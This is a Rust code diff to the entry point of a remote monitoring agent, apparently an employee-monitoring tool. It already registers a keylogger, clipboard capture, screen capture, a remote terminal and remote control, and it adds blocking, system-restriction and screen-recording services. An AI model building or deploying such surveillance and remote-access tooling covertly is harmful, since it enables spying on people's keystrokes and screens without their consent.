@@ -6,8 +6,9 @@
 use netwatch_agent::{
     config::Config,
     services::{
-        ActivityTracker, Clipboard, Commands, FileTransfer, Keylogger, ProcessMonitor,
-        RemoteControl, ScreenCapture, Terminal,
+        ActivityTracker, BlockingService, Clipboard, Commands, FileTransfer, Keylogger,
+        ProcessMonitor, RemoteControl, ScreenCapture, ScreenRecorder, SystemRestrictions,
+        Terminal,
     },
     socket::SocketClient,
 };
@@ -83,6 +84,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let terminal = Terminal::new(socket.clone());
     let file_transfer = FileTransfer::new(socket.clone());
     let commands = Commands::new(socket.clone());
+    let blocking_service = BlockingService::new(socket.clone());
+    let system_restrictions = SystemRestrictions::new(socket.clone());
+    let screen_recorder = ScreenRecorder::new(socket.clone());
 
     // Register event handlers
     {
@@ -91,16 +95,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let keylogger = keylogger.clone();
         let clipboard = clipboard.clone();
         let process_monitor = process_monitor.clone();
+        let blocking_service = blocking_service.clone();
         let is_monitoring = is_monitoring.clone();
 
         socket
-            .on_auth_success(move |config_data| {
+            .on_auth_success(move |_config_data| {
                 info!("Authenticated successfully");
                 let screen_capture = screen_capture.clone();
                 let activity_tracker = activity_tracker.clone();
                 let keylogger = keylogger.clone();
                 let clipboard = clipboard.clone();
                 let process_monitor = process_monitor.clone();
+                let blocking_service = blocking_service.clone();
                 let is_monitoring = is_monitoring.clone();
 
                 tokio::spawn(async move {
@@ -112,6 +118,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     keylogger.start().await;
                     clipboard.start().await;
                     process_monitor.start().await;
+                    blocking_service.start().await;
 
                     info!("All monitoring services started");
                 });
@@ -124,6 +131,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     terminal.register_handlers(&socket).await;
     file_transfer.register_handlers(&socket).await;
     commands.register_handlers(&socket).await;
+    blocking_service.register_handlers(&socket).await;
+    system_restrictions.register_handlers(&socket).await;
+    screen_recorder.register_handlers(&socket).await;
 
     // Register screen stream handlers
     {
@@ -170,6 +180,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let shutdown_clipboard = clipboard.clone();
     let shutdown_process = process_monitor.clone();
     let shutdown_terminal = terminal.clone();
+    let shutdown_blocking = blocking_service.clone();
 
     tokio::spawn(async move {
         tokio::signal::ctrl_c()
@@ -185,6 +196,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         shutdown_clipboard.stop().await;
         shutdown_process.stop().await;
         shutdown_terminal.stop_all().await;
+        shutdown_blocking.stop().await;
 
         // Disconnect socket
         shutdown_socket.disconnect().await;
